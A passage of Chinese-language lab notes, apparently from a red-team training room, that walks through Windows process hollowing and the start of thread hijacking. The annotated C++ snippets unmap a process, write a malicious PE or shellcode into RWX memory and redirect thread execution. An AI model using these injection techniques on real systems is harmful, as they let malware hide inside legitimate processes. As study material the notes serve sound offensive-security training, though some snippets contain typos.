<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 只在指针中存储 CPU 寄存器</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// CONTEXT_INTEGER 是一个标志，它告诉 GetThreadContext 函数，你只关心线程的整数寄存器（如 Eax、Ebx 等），而不需要浮点寄存器或其他信息。这能减少开销，并获得你所需的数据。</span></span>
<span class="line"><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">ContextFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> CONTEXT_INTEGER; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 获取当前线程上下文</span></span>
<span class="line"><span style="color: #61AFEF">GetThreadContext</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 线程 句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">c</span><span style="color: #7F848E; font-style: italic"> // GetThreadContext 函数会将该线程的当前寄存器状态写入这个结构体</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 存储从目标进程读取的基址</span></span>
<span class="line"><span style="color: #ABB2BF">PVOID pTargetImageBaseAddress; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 读取进程内存</span></span>
<span class="line"><span style="color: #61AFEF">ReadProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	(PVOID)(</span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Ebx</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 进程的基址</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 存储基址到这个变量 </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(PVOID),</span><span style="color: #7F848E; font-style: italic"> // 要读取的字节数</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic"> // 读取的字节数，这里用 NULL 代替，表示不关心</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>获取进程的基址后，我们就可以开始取消映射内存了。我们可以从 ntdll.dll 导入 <code>ZwUnmapViewOfSection</code> API 来释放目标进程的内存。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">HMODULE hNtdllBase </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetModuleHandleA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ntdll.dll&quot;</span><span style="color: #ABB2BF">);</span><span style="color: #7F848E; font-style: italic"> // 获取 ntdll 的句柄</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 从 ntdll 里面获取 ZwUnmapViewOfSection API</span></span>
<span class="line"><span style="color: #ABB2BF">pfnZwUnmapViewOfSection pZwUnmapViewOfSection </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (pfnZwUnmapViewOfSection)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	hNtdllBase,</span><span style="color: #7F848E; font-style: italic"> // ntdll 的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #98C379">&quot;ZwUnmapViewOfSection&quot;</span><span style="color: #7F848E; font-style: italic"> // 要获取的 API 函数</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 存储执行 ZwUnmapViewOfSection 的结果，也就是掏空成功与否</span></span>
<span class="line"><span style="color: #ABB2BF">DWORD dwResult </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">pZwUnmapViewOfSection</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 从 PROCESS_INFORMATION 结构体中获取 进程 句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	pTargetImageBaseAddress</span><span style="color: #7F848E; font-style: italic"> // 要掏空的进程的基址</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<h4 id="第四步：重新分配并写入恶意代码">第四步：重新分配并写入恶意代码</h4>
<p>第四步，我们需要在目标进程中重新分配内存，但这回分配的大小不是原文件的大小，而是<strong>恶意代码镜像在内存中所需的大小</strong>。</p>
<p>为了获取这个精确的尺寸，我们必须解析恶意可执行文件（PE 文件）的头部。</p>
<ol>
<li>首先，通过 <code>e_lfanew</code> 字段，我们可以找到从 <strong>DOS 头部</strong>到 <strong>PE 头部</strong>的字节偏移量。</li>
<li>接着，一旦定位到 PE 头部，我们就可以从<strong>可选头部</strong>中读取 <code>SizeOfImage</code> 字段。</li>
</ol>
<p>过程简述：获取 DOS 头部 -&gt; 从 DOS 头部中获取 e_lfanew -&gt; 定位到 NT 头部 -&gt; NT 头部中找到可选头部 -&gt; 找到 SizeOfImage</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 从恶意镜像中获取 DOS 头部</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 将 pMaliciousImage 强制类型转换为 PIMAGE_DOS_HEADER</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 使其能作为指针来访问 PE 文件的 DOS 头部</span></span>
<span class="line"><span style="color: #ABB2BF">PIMAGE_DOS_HEADER pDOSHeader </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_DOS_HEADER)pMaliciousImage;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// PE 文件的核心是 NT 头部，e_lfanew 存储了从文件开头到 NT 头部起始位置的偏移量，而 e_lfanew 是在 DOS 头部中的</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里利用这个偏移量，计算出 NT 头部在内存中的确切位置</span></span>
<span class="line"><span style="color: #ABB2BF">PIMAGE_NT_HEADERS pNTHeaders </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pDOSHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">e_lfanew</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 从 NT 头部结构体中获取可选头部的大小</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// SizeOfImage 定义了可执行文件加载到内存所需的总大小</span></span>
<span class="line"><span style="color: #ABB2BF">DWORD sizeOfMaliciousImage </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">SizeOfImage</span><span style="color: #ABB2BF">; </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 在目标进程中分配内存</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 返回的是分配好的内存的指针地址</span></span>
<span class="line"><span style="color: #ABB2BF">PVOID pHollowAddress </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 目标进程的句柄，从结构体里面拿的</span></span>
<span class="line"><span style="color: #ABB2BF">	pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 进程的基址</span></span>
<span class="line"><span style="color: #ABB2BF">	sizeOfMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 加载到内存所需的总大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">3000</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #7F848E; font-style: italic"> // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>分配好内存后，我们就可以将<strong>恶意文件的内存镜像</strong>写入目标进程。由于 PE 文件的内存镜像结构，我们必须先将 <strong>PE 头部</strong>写入新分配的内存空间。在写入 PE 头部时，我们使用 <code>WriteProcessMemory</code> 函数，并指定 PE 头部的大小来确定写入范围。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	pTargetImageBaseAddress,</span><span style="color: #7F848E; font-style: italic"> // 进程基址</span></span>
<span class="line"><span style="color: #ABB2BF">	pMaliciousImage,</span><span style="color: #7F848E; font-style: italic"> // 内存中恶意镜像文件的地址</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">SizeOfHeaders</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // PE 头的大小</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #D19A66">NULL</span></span>
<span class="line"><span style="color: #ABB2BF">)) {</span></span>
<span class="line"><span style="color: #ABB2BF">	cout</span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;[!] Writting Headers failed. Error: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">GetLastError</span><span style="color: #ABB2BF">() </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> endl;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>现在我们需要写入每个节。要查找节的数量，我们可以使用 NT 头中的 <code>NumberOfSections</code> 。我们可以通过循环遍历 <code>e_lfanew</code> 和当前头的大小来写入每个节。</p>
<img src="/thm_rthe/a2e6d40803c1d01beedd6e821de2e8d6.png" class="" title="img">
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 根据 PE 中的分段数进行循环</span></span>
<span class="line"><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> i </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; i </span><span style="color: #C678DD">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">FileHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">NumberOfSections</span><span style="color: #ABB2BF">; i</span><span style="color: #C678DD">++</span><span style="color: #ABB2BF">) { </span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 确定当前的 PE 节头部 强制转换成 PIMAGE_SECTION_HEADER 结构体</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 计算出当前节的头部在恶意文件内存中的精确位置</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // DOS 头到 NT 头部的偏移量 + NT 头本身的大小 + 节数 * 节头部的大小 = 要写入的节头部地址</span></span>
<span class="line"><span style="color: #ABB2BF">	PIMAGE_SECTION_HEADER pSectionHeader </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pDOSHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">e_lfanew</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(IMAGE_NT_HEADERS) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> (i </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(IMAGE_SECTION_HEADER))); </span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 进程句柄</span></span>
<span class="line"><span style="color: #ABB2BF">		(PVOID)((LPBYTE)pHollowAddress </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">VirtualAddress</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 要写入的目标地址 当前节在内存中的相对地址，这是在节里面定义好的</span></span>
<span class="line"><span style="color: #ABB2BF">		(PVOID)((LPBYTE)pMaliciousImage </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">PointerToRawData</span><span style="color: #ABB2BF">),</span><span style="color: #7F848E; font-style: italic"> // 源地址 当前节在文件中的偏移量 镜像基址 + 当前节数据的偏移量 = 节开始的地址</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #E5C07B">pSectionHeader</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">SizeOfRawData</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 当前节的原始数据大小</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #D19A66">NULL</span><span style="color: #7F848E; font-style: italic"> // 写入了多少字节</span></span>
<span class="line"><span style="color: #ABB2BF">	);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h4 id="第五步：修改上下文并恢复线程">第五步：修改上下文并恢复线程</h4>
<p>我们使用 <code>SetThreadContext</code> 将 <code>EAX</code> 更改为指向入口点，最后使用 <code>ResumeThread</code> 将进程从挂起状态中恢复。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 将挂起线程的 EAX 寄存器修改为恶意镜像的入口点地址。当线程恢复时，它将从这个新的地址开始执行。</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 c 是上下文结构体</span></span>
<span class="line"><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">Eax</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (SIZE_T)((LPBYTE)pHollowAddress </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">pNTHeaders</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E5C07B">OptionalHeader</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">AddressOfEntryPoint</span><span style="color: #ABB2BF">); </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 修改线程的上下文</span></span>
<span class="line"><span style="color: #61AFEF">SetThreadContext</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">,</span><span style="color: #7F848E; font-style: italic"> // 线程句柄</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">c</span><span style="color: #7F848E; font-style: italic"> // 指向存储的上下文结构的指针</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">ResumeThread</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">target_pi</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">hThread</span><span style="color: #7F848E; font-style: italic"> // 线程句柄</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>这样就完成了一个进程空洞注入。</p>
<h3 id="实战">实战</h3>
<p>靶机里面有一个 demo，这里就不贴代码了。注意要用 32 位环境编译，被注入和注入的程序都要 32 位的，可以自己写一个简单的输入输出模拟一下就 OK 了，我这里是用的一个输出固定字符串的文件来检验我注入是否成功了。</p>
<figure class="shiki c++"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;iostream&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    std::cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Pwned!</span><span style="color: #56B6C2">\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">system</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;pause&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h2 id="Thread-Hijacking-线程劫持">Thread Hijacking 线程劫持</h2>
<p>这里原标题是 Abusing Process Components ，但是实际讲的是线程执行</p>
<p>线程劫持可分为十个步骤：</p>
<ol>
<li>定位并打开要控制的目标进程。</li>
<li>为恶意代码分配内存区域。</li>
<li>在分配的内存中编写恶意代码。</li>
<li>确定要劫持的目标线程的线程 ID。</li>
<li>打开目标线程。</li>
<li>暂停目标线程。</li>
<li>获取线程上下文。</li>
<li>更新恶意代码的指令指针。</li>
<li>重写目标线程上下文。</li>
<li>恢复被劫持的线程。</li>
</ol>
<p>这个技术的前三步和之前讲过的是一样的，获取进程句柄，分配内存，写入 shellcode 进内存。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">HANDLE hProcess </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, processId);</span></span>
<span class="line"><span style="color: #ABB2BF">PVOIF remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(hProcess, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, sizeof shellcode, (MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(processHandle, remoteBuffer, shellcode, sizeof shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure>
<p>第四步，我们首先使用 <code>CreateToolhelp32Snapshot</code> API 创建一个包含所有线程信息的系统快照。接着，利用 <code>Thread32First</code> 和 <code>Thread32Next</code> 遍历这个快照，找到与目标进程 ID 匹配的线程 ID。找到后，我们使用 <code>OpenThread</code> API 获取这个目标线程的句柄，以便后续操作。</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot function</a></li>
<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first">Thread32First function</a></li>
</ul>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 初始化结构体</span></span>
<span class="line"><span style="color: #ABB2BF">THREADENTRY32 threadEntry;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">HANDLE hSnapshot </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateToolhelp32Snapshot</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">    TH32CS_SNAPTHREAD,</span><span style="color: #7F848E; font-style: italic"> // 快照系统中的所有线程</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">0</span><span style="color: #7F848E; font-style: italic">                  // 指示当前进程，不过这里会被忽略，返回的所有的进程的快照</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 获取快照中的第一个线程</span></span>
<span class="line"><span style="color: #61AFEF">Thread32First</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">    hSnapshot,</span><span style="color: #7F848E; font-style: italic">   // 快照的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">threadEntry</span><span style="color: #7F848E; font-style: italic"> // 指向 THREADENTRY32 的结构体指针</span></span>
<span class="line"><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">do</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32OwnerProcessID</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> processID)</span><span style="color: #7F848E; font-style: italic"> // 匹配进程 ID</span></span>
<span class="line"><span style="color: #ABB2BF">    {</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">        // 打开找到进程的线程的句柄</span></span>
<span class="line"><span style="color: #ABB2BF">        HANDLE hThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenThread</span><span style="color: #ABB2BF">(THREAD_ALL_ACCESS, FALSE, </span><span style="color: #E5C07B">threadEntry</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">th32ThreadID</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">} </span><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">Thread32Next</span><span style="color: #ABB2BF">(hsnapshot, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">threadEntry));</span></span></code></pre></div></div></figure>
<p>第六步，挂起线程。接着，我们使用 <code>GetThreadContext</code> 获取线程的上下文。在 <code>CONTEXT</code> 结构体中，我们找到并修改<strong>指令指针寄存器</strong>（在 x64 系统上为 <code>RIP</code>，在 x86 系统上为 <code>EIP</code>），让它指向我们之前注入的 <code>shellcode</code> 的内存地址。最后，用 <code>SetThreadContext</code> 将修改后的上下文写回线程。最后一步让程序继续运行就 OK 了。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 挂起线程</span></span>
<span class="line"><span style="color: #61AFEF">SuspendThread</span><span style="color: #ABB2BF">(hThread);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 定义一个 CONTEXT 结构体</span></span>
<span class="line"><span style="color: #ABB2BF">CONTEXT context;</span></span>
<span class="line"></span>
